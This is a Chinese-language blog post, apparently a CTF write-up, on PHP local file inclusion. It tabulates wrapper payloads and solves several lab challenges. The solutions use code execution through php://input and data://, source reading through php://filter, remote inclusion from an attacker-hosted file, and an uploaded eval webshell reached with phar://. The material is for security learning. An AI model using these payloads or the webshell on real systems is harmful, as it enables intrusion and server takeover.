---
title: Local file include
tags:
  - CTF
  - 本地文件包含
catagories: CTF
mathjax: true
abbrlink: 25287
date: 2023-10-31 19:42:00
update: 2023-10-31 19:42:00
---
本地文件包含经常配合文件上传使用。即上传图片马->文件包含执行
# PHP伪协议
<center>

|协议|allow_url_fopen|allow_url_include|PHP版本|用法  
|:---:|:---:|:---:|:---:|:---:|  
|php://input|不受限|On||?file=php://input [POST DATA] <?php [代码] ?>|  
|php://filter|不受限|不受限||?file=php://filter/read=convert.base64-encode/resource=xxx.php|  
|zip://、zlib://、bzip://|不受限|不受限|>=php5.3.0|?file=zip://[压缩包绝对路径]%23[压缩包内文件]  
|phar://|不受限|不受限|>=php5.3.0|?file=phar://[压缩包路径]/[压缩包内文件]  
|data://|On|On||?file=data://, ?file=data://text/plain, ?file=data://text/plain;base64,[编码后的php代码]

</center>

``allow_url_fopen``为``On``时，能读取远程文件，例如``file_get_contents()``就能读远程文件  
``allow_url_include``为``On``时，就能使用``include``和``require``等方式包含远程文件  
需要注意的是，zip://伪协议需要安装zlib扩展  
## php://input
### Yulin招新LFI第二题  
打开题目页面，只有一个phpinfo链接  
![题目](./Local%20file%20include/1.png "题目")  
查看*phpinfo*，发现``allow_url_fopen``和``allow_url_include``都为$On$
![phpinfo](./Local%20file%20include/2.png "phpinfo")  
任意包含一个文件，出现提示 *flag在当前目录的某个文件中*  
因此考虑使用``php://input``伪协议执行代码
![post](./Local%20file%20include/3.png "post")  
构造代码``<?php system("ls"); ?>``进行post，得到文件列表，flag显然在flag_195780473.txt中，``cat flag_195780473.txt``得到flag  
![flag](./Local%20file%20include/4.png "flag")
### Yulin招新LFI第五题
打开题目页面，展示了源代码  
![题目](./Local%20file%20include/9.png "题目")  
发现代码逻辑为读取``file``参数传入的文件内容，将其与``I want flag``进行比较，相等则给出flag  
刚开始思路为远程文件包含。在远程服务器建立html文件，内容为``I want flag``，**使用file_put_contents函数**构造payload``?file=http://[remote addr]/payload.html``直接get远程文件即可  
![flag](./Local%20file%20include/16.png "flag")  
该题还可以使用``php://input``伪协议绕过``file_get_contents``函数  
在burpsuite构建post数据  
![post](./Local%20file%20include/10.png "post")  
成功get flag
![flag](./Local%20file%20include/11.png "flag")  
参考：[CTF bugku web file_get_contents WriteUp](https://zhuanlan.zhihu.com/p/401511726)
## data://
### Yulin招新LFI第三题  
题目页面同上第二题，只有一个phpinfo链接，查看*phpinfo*，发现``allow_url_fopen``和``allow_url_include``都为$On$  
![phpinfo](./Local%20file%20include/2.png "phpinfo")  
重复上题操作，发现题目过滤了``php://input``伪协议  
![hack](./Local%20file%20include/5.png "hack")  
因此考虑使用``data://``伪协议，尝试构造payload``?file=data://text/plain,%20<?php%20system("ls");%20?>``，发现执行成功  
![ls](./Local%20file%20include/6.png "ls")  
直接``cat flag_8491675293.txt``得到flag  
![flag](./Local%20file%20include/7.png "flag")  
## php://fliter
以Yulin招新LFI第四题为例  
题目页面提示flag就在flag.php内
![tips](./Local%20file%20include/8.png "tips")  
但没有显示，因此考虑使用``php://fliter``伪协议直接读取flag.php内容  
![](./Local%20file%20include/6.png "ls")  
得到flag.php内容的base64编码
```base64
ZmxhZ+WwseWcqOi/me+8jOWPr+aYr+iXj+WcqOWTqumHjO+8nyjila/CsNCUwrAp4pWvIOKUu+KUgeKUuw0KPD9waHANCiRmbGFnID0gJ1l1bGluU2Vje04wd195MHVfc2VlX21lITc1MTRXUXp4d30nOw0KPz4NCg==
```
解码得到flag
```php
flag就在这，可是藏在哪里？(╯°Д°)╯ ┻━┻
<?php
$flag = 'YulinSec{N0w_y0u_see_me!7514WQzxw}';
?>
```
## phar://
### Yulin招新LFI第六题   
打开题目，观察链接，推测文件包含时在输入的``file``值后添加了``.php``，因此无法直接构造图片马上传  
![题目](./Local%20file%20include/12.png "题目")  
因此考虑使用压缩包上传木马，构造木马
```php
<?php @eval($_POST['6']);
```
将其压缩为zip上传  
![upload](./Local%20file%20include/13.png "upload")  
打开蚁剑，用``phar://``伪协议直接连接  
![connect](./Local%20file%20include/14.png "connect")  
成功get flag  
![flag](./Local%20file%20include/15.png "flag")  